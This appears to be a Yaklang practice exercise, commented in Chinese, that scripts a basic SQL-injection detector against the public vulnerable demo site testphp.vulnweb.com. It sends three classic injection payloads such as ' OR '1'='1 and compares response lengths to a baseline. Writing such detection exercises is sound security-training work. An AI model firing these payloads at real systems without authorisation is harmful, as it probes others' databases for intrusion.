// Hard: HTTP 请求构造与 SQL 注入检测
// 构造带 Payload 的 HTTP 请求，检测 SQL 注入漏洞

// ========================================
// 配置参数
// ========================================

// 目标 URL（这里使用一个示例，实际测试请替换为真实目标）
targetURL = "http://testphp.vulnweb.com/artists.php?artist=1"

// SQL 注入测试 Payloads
payloads = [
    "' OR '1'='1",
    "' AND '1'='2",
    "1' OR '1'='1' --"
]

println("=== SQL Injection Detection Tool ===")
println(f"Target: ${targetURL}\n")

// ========================================
// 辅助函数：解析 URL
// ========================================

parseURL = func(url) {
    // 提取 scheme
    schemeEnd, _, _ = str.Cut(url, "://")
    if schemeEnd == url {
        die("Invalid URL: no scheme found")
    }
    
    // 分离 scheme 和剩余部分
    parts = str.SplitN(url, "://", 2)
    scheme = parts[0]
    remaining = parts[1]
    
    // 分离 host 和 path
    hostPath = str.SplitN(remaining, "/", 2)
    host = hostPath[0]
    pathQuery = "/"
    if len(hostPath) > 1 {
        pathQuery = "/" + hostPath[1]
    }
    
    // 分离 path 和 query
    path = pathQuery
    query = ""
    if str.Contains(pathQuery, "?") {
        pathParts = str.SplitN(pathQuery, "?", 2)
        path = pathParts[0]
        query = pathParts[1]
    }
    
    return {
        "scheme": scheme,
        "host": host,
        "path": path,
        "query": query,
        "full": url
    }
}

// ========================================
// 解析目标 URL
// ========================================

urlInfo = parseURL(targetURL)

// ========================================
// 发送基线请求
// ========================================

println("Sending baseline request...")
try {
    baselineResp, err = http.Get(targetURL, http.timeout(10))~
    baselineBody = poc.GetHTTPPacketBody(baselineResp)
    baselineLength = len(baselineBody)
    baselineStatus = poc.GetStatusCodeFromResponse(baselineResp)
    
    println(f"  Baseline length: ${baselineLength} bytes")
    println(f"  Baseline status: ${baselineStatus}\n")
} catch err {
    println(f"Error sending baseline request: ${err}")
    die("Cannot establish baseline")
}

// ========================================
// 测试每个 Payload
// ========================================

results = []

for i, payload in payloads {
    println(f"[${i+1}/${len(payloads)}] Testing payload: ${payload}")
    
    // 构造测试 URL
    // 假设注入点在第一个参数值
    if urlInfo["query"] != "" {
        // 提取参数名和值
        queryParts = str.SplitN(urlInfo["query"], "=", 2)
        if len(queryParts) == 2 {
            paramName = queryParts[0]
            // 构造新的查询字符串
            testQuery = paramName + "=" + codec.EncodeUrl(payload)
            testURL = urlInfo["scheme"] + "://" + urlInfo["host"] + urlInfo["path"] + "?" + testQuery
        } else {
            testURL = targetURL + codec.EncodeUrl(payload)
        }
    } else {
        testURL = targetURL + "?" + codec.EncodeUrl(payload)
    }
    
    println(f"  Testing URL: ${testURL}")
    
    // 发送测试请求
    try {
        startTime = time.Now()
        testResp, err = http.Get(testURL, http.timeout(10))~
        endTime = time.Now()
        duration = endTime.Sub(startTime)
        
        testBody = poc.GetHTTPPacketBody(testResp)
        testLength = len(testBody)
        testStatus = poc.GetStatusCodeFromResponse(testResp)
        
        println(f"  Status: ${testStatus}")
        println(f"  Length: ${testLength} bytes")
        println(f"  Time: ${duration}\n")
        
        // 保存结果
        result = {
            "payload": payload,
            "status": testStatus,
            "length": testLength,
            "duration": duration,
            "diff": testLength - baselineLength,
            "diffPercent": float(testLength - baselineLength) / float(baselineLength) * 100
        }
        results = append(results, result)
        
    } catch err {
        println(f"  Error: ${err}\n")
        result = {
            "payload": payload,
            "error": err
        }
        results = append(results, result)
    }
}

// ========================================
// 分析结果
// ========================================

println("=== Detection Results ===")

// 判断逻辑：如果任何响应的长度差异超过 20%，认为可能存在注入
threshold = 20.0
suspiciousResults = []

for result in results {
    if result["error"] != undefined {
        continue
    }
    
    if result["diffPercent"] > threshold || result["diffPercent"] < -threshold {
        suspiciousResults = append(suspiciousResults, result)
    }
}

// 输出检测结果
if len(suspiciousResults) > 0 {
    println("✓ Potential SQL Injection found!\n")
    
    println("Evidence:")
    println("  - Response length variation detected")
    
    for result in suspiciousResults {
        diffSign = "+"
        if result["diffPercent"] < 0 {
            diffSign = ""
        }
        println(f"  - Payload \"${result['payload']}\" returned different length (${diffSign}${sprintf('%.0f', result['diffPercent'])}%)")
    }
    
    println("\nConfidence: Medium")
    println("Recommendation: Manual verification required")
} else {
    println("✗ No obvious SQL Injection detected")
    println("\nNote: This is a simple detection based on response length.")
    println("False negatives are possible. Manual testing recommended.")
}

// ========================================
// 验证测试
// ========================================

// 基本验证
assert baselineLength > 0, "Baseline request should return data"
assert len(results) == len(payloads), "Should test all payloads"

// 验证每个结果都有必要的字段
for result in results {
    if result["error"] == undefined {
        assert result["status"] > 0, "Should have valid status code"
        assert result["length"] >= 0, "Should have valid length"
    }
}

println("\n✓ All tests completed!")

/*
验证方法：
在命令行执行：
  yak PRACTICE_hard_http_request_builder.yak

注意：
1. 此脚本需要网络连接
2. 目标 URL 需要是可访问的
3. 如果目标不可用，可以修改为本地测试环境

预期输出示例：
  === SQL Injection Detection Tool ===
  Target: http://testphp.vulnweb.com/artists.php?artist=1
  
  Sending baseline request...
    Baseline length: 4523 bytes
    Baseline status: 200
  
  [1/3] Testing payload: ' OR '1'='1
    Testing URL: http://testphp.vulnweb.com/artists.php?artist=%27+OR+%271%27%3D%271
    Status: 200
    Length: 7891 bytes
    Time: 234ms
  
  [2/3] Testing payload: ' AND '1'='2
    Testing URL: http://testphp.vulnweb.com/artists.php?artist=%27+AND+%271%27%3D%272
    Status: 200
    Length: 3210 bytes
    Time: 189ms
  
  [3/3] Testing payload: 1' OR '1'='1' --
    Testing URL: http://testphp.vulnweb.com/artists.php?artist=1%27+OR+%271%27%3D%271%27+--
    Status: 200
    Length: 7903 bytes
    Time: 245ms
  
  === Detection Results ===
  ✓ Potential SQL Injection found!
  
  Evidence:
    - Response length variation detected
    - Payload "' OR '1'='1" returned different length (+74%)
    - Payload "' AND '1'='2" returned different length (-29%)
    - Payload "1' OR '1'='1' --" returned different length (+75%)
  
  Confidence: Medium
  Recommendation: Manual verification required
  
  ✓ All tests completed!

测试要点：
1. 能正确解析 URL
2. 能构造带编码的测试 URL
3. 能发送 HTTP 请求并获取响应
4. 能分析响应长度差异
5. 能根据差异判断可能的漏洞
6. 错误处理完善

关键技术：
1. URL 解析和重构
2. URL 编码处理
3. HTTP 请求发送
4. 响应分析
5. 漏洞判断逻辑
6. 异常处理

扩展思路：
- 可以添加更多 Payload
- 可以添加响应内容关键字检测
- 可以添加时间盲注检测
- 可以支持 POST 请求
- 可以添加 Cookie/Header 注入点测试
*/

